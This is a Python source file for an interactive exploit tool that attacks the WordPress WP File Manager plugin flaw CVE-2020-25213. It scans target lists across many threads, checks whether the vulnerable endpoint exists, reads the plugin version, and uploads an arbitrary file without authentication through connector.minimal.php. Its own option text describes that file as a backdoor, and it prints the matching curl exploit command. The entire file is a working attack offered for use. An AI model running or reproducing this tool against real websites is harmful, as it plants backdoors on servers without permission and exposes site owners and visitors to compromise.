import os
import requests
import threading
import urllib3
from lib.colors import *
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WpFm:
    def __init__(self):
        self.options = {
            "TARGET": {"value": None, "required": True, "description": "The target address or target list (file.txt)"},
            "CHECK": {"value": None, "required": False, "description": "Checks whether the vulnerable endpoint exists & has a particular fingerprint or not. No file is uploaded."},
            "CHECK_VERSION": {"value": None, "required": False, "description": "Check the version of the WP File Manager plugin"},
            "UPLOAD_FILE": {"value": None, "required": False, "description": "Upload your backdoor to website"},
            "VERBOSE": {"value": "yes", "required": True, "description": "Also prints curl command which is going to be executed"},
            "THREADS": {"value": 10, "required": False, "description": "Number of threads to use for running exploits"}
        }
        self.command = {
            "exploit": self.run_exploit,
            "set": self.set_option,
            "show": self.show_options,
            "exit": self.exit_shell
        }
        self.running = True

    def set_option(self, option, value):
        if option in self.options:
            self.options[option]["value"] = value
        else:
            print(f"Option {option} does not exist.")

    def show_options(self, *args):
        print(f"\n\tPlugins option ({light.magenta}WP-file-manager expoit CVE-2020-25213{close.reset})\n")
        print(f"\t{'Name':<15} {'Current Setting':<20} {'Required':<10} {'Description':<40}")
        print(f"\t{'-'*15} {'-'*20} {'-'*10} {'-'*40}")
        for option, details in self.options.items():
            value = details["value"] if details["value"] else ""
            required = "yes" if details["required"] else "no"
            description = details["description"]
            print(f"\t{option:<15} {value:<20} {required:<10} {description:<40}")
        print("")

    def exit_shell(self, *args):
        self.running = False

    def run_exploit(self, *args):
        targets = self.get_targets()
        file_upload = self.options["UPLOAD_FILE"]["value"]
        verbose = self.options["VERBOSE"]["value"].lower() == 'yes'
        threads = int(self.options["THREADS"]["value"])

        def worker(target):
            if self.options["CHECK"]["value"]:
                self.check_vulnerability(target, verbose)

            if self.options["CHECK_VERSION"]["value"]:
                self.check_version(target, verbose)

            if file_upload:
                self.upload_file(target, file_upload, verbose)

        for i in range(0, len(targets), threads):
            threads_list = []
            for target in targets[i:i + threads]:
                t = threading.Thread(target=worker, args=(target,))
                threads_list.append(t)
                t.start()
            for t in threads_list:
                t.join()

    def get_targets(self):
        target_option = self.options["TARGET"]["value"]
        if os.path.isfile(target_option):
            with open(target_option, 'r') as file:
                targets = [line.strip() for line in file.readlines()]
        else:
            targets = [target_option]
        return targets

    def check_vulnerability(self, target, verbose):
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
        target_endpoint = f"{target}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
        headers = {'User-Agent': user_agent}

        try:
            response = requests.get(target_endpoint, headers=headers, timeout=5, verify=False)
            if response.status_code == 200:
                print(f"[{light.green} ✓ {close.reset}] Target {target} is vulnerable.")
            else:
                print(f"[{dark.red} ✗ {close.reset}] Target {target} is not vulnerable.")
        except requests.exceptions.RequestException as e:
            print(f"[{dark.black} ! {close.reset}] Request to {target} failed: {e}")

    def check_version(self, target, verbose):
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
        target_endpoint = f"{target}/wp-content/plugins/wp-file-manager/readme.txt"
        headers = {'User-Agent': user_agent}

        try:
            response = requests.get(target_endpoint, headers=headers, timeout=5, verify=False)
            if response.status_code == 200:
                version_info = self.extract_version(response.text)
                print(f"[{light.blue} ! {close.reset}] Target {target} plugin version: {light.cyan}{version_info}{close.reset}")
            else:
                print(f"[{dark.red} ✗ {close.reset}] Failed to retrieve version info from {target}.")
        except requests.exceptions.RequestException as e:
            print(f"[{dark.black} ! {close.reset}] Request to {target} failed: {e}")

    def extract_version(self, text):
        for line in text.split('\n'):
            if "Stable tag" in line:
                return line.split(':')[-1].strip()
        return "Unknown"

    def upload_file(self, target, file_upload, verbose):
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
        target_endpoint = f"{target}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
        files = {
            'reqid': (None, '17457a1fe6959'),
            'cmd': (None, 'upload'),
            'target': (None, 'l1_Lw'),
            'mtime[]': (None, '1576045135'),
            'upload[]': (os.path.basename(file_upload), open(file_upload, 'rb'))
        }
        headers = {'User-Agent': user_agent}

        if verbose:
            curl_command = f"curl -ks --max-time 5 --user-agent \"{user_agent}\" -F \"reqid=17457a1fe6959\" -F \"cmd=upload\" -F \"target=l1_Lw\" -F \"mtime[]=1576045135\" -F \"upload[]=@{file_upload}\" {target_endpoint}"
            print(f"[*] Executing command: {curl_command}")

        try:
            response = requests.post(target_endpoint, files=files, headers=headers, timeout=5, verify=False)
            if response.status_code == 200:
                print(f"[{light.green} ✓ {close.reset}] File uploaded successfully to {target}.")
                if verbose:
                    print(f"[*] {response.text}")
            else:
                print(f"[{dark.red} ✗ {close.reset}] File upload failed to {target}.")
        except requests.exceptions.RequestException as e:
            print(f"[{dark.black} ! {close.reset}] Request to {target} failed: {e}")

    def shell(self):
        pl = f'{light.blue}={close.reset}'*50
        print(f"""
\t{pl}\n
\t\tWP-file-manager expoit CVE-2020-25213\n
\tcommand 'show options' view for options this tool\n
\t{pl}
          """)
        while self.running:
            try:
                command = input(f"\t{light.cyan}Ethopia > {close.reset}").strip().split()
                if not command:
                    continue

                cmd = command[0]
                args = command[1:]

                if cmd in self.command:
                    self.command[cmd](*args)
                else:
                    print(f"Unknown command: {cmd}")
            except (KeyboardInterrupt, EOFError):
                print("\nExiting...")
                break

if __name__ == "__main__":
    exploit = WpFm()
    exploit.shell()
